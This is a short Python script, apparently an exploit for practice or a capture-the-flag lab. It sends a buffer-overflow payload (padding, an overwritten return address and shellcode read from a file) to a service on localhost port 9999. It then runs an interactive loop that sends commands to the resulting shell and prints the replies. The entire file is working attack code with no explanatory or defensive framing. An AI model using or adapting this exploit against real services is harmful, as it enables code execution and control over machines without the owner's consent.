#!/usr/bin/env python3


import socket
import struct
import sys


with open(sys.argv[1], 'rb') as f:
    shellcode = f.read()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
input('press any key to start exploit... ')
s.send(b'.' * (int(sys.argv[2]) + 8) + struct.pack('<Q', int(sys.argv[3], 16)) + shellcode + b'\n')
while True:
    cmd = input('> ')
    if cmd == '.':
        break
    s.send(cmd.encode() + b'\n')
    print(s.recv(4096).decode('ascii', 'ignore'))
s.close()